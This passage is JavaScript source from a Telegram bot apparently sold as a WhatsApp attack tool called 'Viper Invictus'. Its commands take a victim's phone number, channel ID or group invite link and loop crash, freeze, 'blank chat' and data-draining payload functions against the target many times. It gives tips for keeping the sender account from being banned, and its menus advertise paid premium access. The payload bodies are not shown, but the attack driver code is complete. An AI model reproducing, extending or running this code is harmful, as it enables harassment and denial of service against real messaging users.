    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は 𝗩𝗶𝗽𝗲𝗿 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 7.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ sennsofhopee.t.me あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @sennsofhopee
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Viper Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 7.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tʀᴀsʜ ☇ Mᴇɴᴜ",
        callback_data: "attackmenu_menu",
      },
      {
        text: "Mᴅ ☇ Mᴇɴᴜ",
        callback_data: "group_menu",
      },
    ],
    [
      {
        text: "Tʜᴀɴᴋs ☇ Tᴏ",
        callback_data: "thanks_menu",
      },
    ],
    [
      {
        text: "Cᴏɴᴛʀᴏʟ ☇ Mᴇɴᴜ",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "Bᴜʏ ☇ Sᴄʀɪᴘᴛ",
        callback_data: "buy_menu",
      },      
    ],
    [
      {
        text: "Oᴡɴᴇʀ ☇ Sᴄʀɪᴘᴛ",
        url: "https://t.me/sennsofhopee",
      },      
      {
        text: "Cʜᴀɴɴᴇʟ ☇ Oᴡɴᴇʀ",
        url: "https://t.me/senn_official",
      },
    ],
    [
      {
        text: "➕ Aᴅᴅ ☇ Bᴏᴛ ",
        url: "https://t.me/sennjboaddbot?startgroup=false", },           
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});


bot.command("attack", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`

    : ctx.from.first_name || "User";
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Example: /attack 62xxx");

    const cleanNumber = q.replace(/[^0-9]/g, '');
    const finalNumber = `${cleanNumber}@s.whatsapp.net`;
    const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 

    const caption = `
「©️ @sennsofhopee 」
⫹⫺ - +${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚
`;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "𝗙𝗢𝗥𝗖𝗘 𝗜𝗣𝗛𝗢𝗡𝗘 👻", callback_data: `attack_iosinvinity:${finalNumber}` },
                    { text: "𝗗𝗘𝗟𝗔𝗬 𝗩𝗜𝗦𝗜𝗕𝗟𝗘 🧬", callback_data: `attack_carousel:${finalNumber}` },    
                ],
                [
                    { text: "𝗗𝗘𝗟𝗔𝗬 𝗜𝗣𝗛𝗢𝗡𝗘 📱", callback_data: `attack_delayios:${finalNumber}` },
                    { text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝗗𝗘𝗟𝗔𝗬 🫀", callback_data: `attack_chidorkk:${finalNumber}` },                         ],
                [
                    { text: "𝗗𝗥𝗔𝗜𝗡 𝗞𝗨𝗢𝗧𝗔 🔥", callback_data: `attack_buldozer:${finalNumber}` },          
                    { text: "𝗕𝗟𝗔𝗡𝗞 𝟭 𝗠𝗦𝗚 🎁", callback_data: `attack_chidoriii:${finalNumber}` },             
                ],
                [                
                    { text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟭𝟭 🗯️", callback_data: `attack_protocoll:${finalNumber}` },
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗦𝗬𝗦𝗧𝗘𝗠 🦠", callback_data: `attack_jjmbudd:${finalNumber}` },       
                ],
                [                
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗜𝗣𝗛𝗢𝗡𝗘 👽", callback_data: `attack_delayui:${finalNumber}` },
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 💣", callback_data: `attack_uinibos:${finalNumber}` },            
                ],
                [
                    { text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗩𝗜𝗗𝗘𝗢 🥶", callback_data: `attack_chidoruu:${finalNumber}` },  
                ]
            ]
        }
    };

    await ctx.replyWithPhoto("https://files.catbox.moe/zrhmp1.jpg", {
        caption,
        ...keyboard,
    });
});
bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];

  await ctx.answerCbQuery();

  try {
    switch (bugType) {
      case "chidorkk":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1500);
        }
        break;

      case "delayxinvis":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1000);
        }
        break;

      case "chidoruu":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 40; i++) {
          await VideoFrezeeUiVnXV3(sock, target);
          await sleep(2500);
        }
        break;

      case "chidoriii":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 1; i++) {
          await XProtexBlankChatV5(sock, target);
          await sleep(1000);
        }
        break;
        
      case "protocoll":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await RazzxBuldozer(target);
          await sleep(1000);
        }
        break;
        
      case "buldozer":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await RazzxBuldozer(target);
          await sleep(1000);
        }
        break;
     
      case "delayui":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 150; i++) {
          await SennUiOverload(target);
          await sleep(1000);
        }
        break;
        
      case "jjmbudd":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await SennUiOverload(target);
          await sleep(1500);
        }
        break;
        
      case "delayios":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await IPhoneDelay(target, ptcp = true);
          await sleep(1000);
        }
        break;

      case "iosinvinity":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await NewlasterFollCrashIos(sock, target);
          await sleep(1000);
        }
        break;        
                
      case "carousel":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1000);
        }
        break;

      case "poseidon":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await DelayHardSwVnX(sock, target, mention = true);
          await DelayHardSwVnX(sock, target, mention = true);
          await sleep(1000);
        }
        break;

      case "chidori":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 5; i++) {
          await XProtexBlankChatV5(sock, target);
          await sleep(1000);
        }
        break;

      case "uinibos":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 50; i++) {
          await OneTapLoca(sock, target);
          await sleep(1000);
        }
        break;        

      default:
        return ctx.reply("❌ Bug tidak ditemukan.");
    }

    await ctx.replyWithPhoto("https://e.top4top.io/p_3465ccjb11.jpg", {
      caption: `\`\`\`
「 SUCCESFULLY KILL TARGET 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${cleanNumber}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
jeda 3/5 menit agar sender tidak terbanned
 \`\`\` "")}`
    });

  } catch (err) {
    console.error(err);
    await ctx.reply("Succues Sending Bug, jeda 3/5 menit agar sender tidak terbanned");
  }
});
//////// -- CASE DELAY FREE LOOP --- \\\\\\\\\\\
bot.command("xslomotion", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  
  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ").slice(1);

  const number = args[0];
  const loop = parseInt(args[1]) || 50;   // default 50
  const sleepDelay = parseInt(args[2]) || 1000; // default 1000ms

  if (!number) {
    return ctx.reply(`Example:
/xslomotion 62812xxxx 150 1000

Format:
/xslomotion nomor loop sleep(ms)`);
  }

  const target = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(
    "https://files.catbox.moe/zrhmp1.jpg",
    {
      caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${number}
☇ Loop: ${loop}
☇ Delay: ${sleepDelay} ms
☇ Status: Sending
☇ Type: /xslomotion 
`,
      parse_mode: "HTML",
    }
  );

  console.log(`Process Sending To ${target}`);

  for (let i = 0; i < loop; i++) {
    await DelayInvisVnXNew(sock, target);
    await sleep(sleepDelay);
    await DelayInvisVnXNew(sock, target);
    await sleep(sleepDelay);
  }

  await ctx.editMessageCaption(
    `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${number}
☇ Loop: ${loop}
☇ Delay: ${sleepDelay} ms
☇ Status: Succes
☇ Type: /xslomotion 

<blockquote> DONE </blockquote>
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Check ϟ Target", url: `https://wa.me/${number}` }]
        ],
      },
    }
  );
});
//////// -- CASE BUG CH --- \\\\\\\\\\\
bot.command("newsletterfc", checkWhatsAppConnection, checkPremium, async ctx => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(
      `❌ Syntax Error!\n\nUse : /newsletterfc <id channel>\nExample : /newsletterfc 120363×××\n© 𖣂-⛧☇ 𝑺͢͟𝒆͠𝒏𝒏⛧༑. ϟ`
    );

    let target = q.replace(/[^0-9]/g, '') + "@newsletter";

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 50; i++) {
      await FcCh(target);
      await sleep(3000);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
      caption: `
[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆

• 🦠 𝘛𝘺𝘱𝘦 : *Invisible Crash Newsletter*
• ⏳ 𝘚𝘵𝘢𝘵𝘶𝘴 : *Terkirim*

𝘕𝘰𝘵𝘦 :
𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕「📱」",
              url: `https://wa.me/${target}`
            }
          ]
        ]
      }
    });
});
//////// -- CASE BUG GB --- \\\\\\\\\\\
bot.command("crashnoclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashnoclickgroup https://chat.whatsapp.com/xxxx atau /crashnoclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashnoclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 50; i++) {
        await CrashChNew2026(sock, target);
        await sleep(4000);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("crashclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashclickgroup https://chat.whatsapp.com/xxxx atau /crashclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 15; i++) {
        await SennClick(target);
        await sleep(2500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("blankclickgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /blankclickgroup https://chat.whatsapp.com/xxxx atau /blankclickgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /blankclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await BlankGcSenn(target);
        await sleep(3000);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("crashclickcomu", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /crashclickcomu https://chat.whatsapp.com/xxxx atau /crashclickcomu 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`Javascript 交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /crashclickgroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 15; i++) {
        await SennClick(target);
        await sleep(2500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("uigroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /uigroup https://chat.whatsapp.com/xxxx atau /uigroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /uigroup
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await blankInfinity(sock, target);
        await sleep(5500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("uicomu", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /uicomu https://chat.whatsapp.com/xxxx atau /uicomu 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
       caption: `\`\`\`交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬 交  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.\`\`\`

" バグ情報
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /uicomu
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "grup_menu" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await blankInfinity(sock, target);
        await sleep(5500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
bot.command("comboblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);  
      await BlankInteractiveNewVnX(sock, target);
      await DenixAmpas(target);   
      await sleep(1000);
    }
  })();
});
bot.command("blankloca", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("viperlayinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
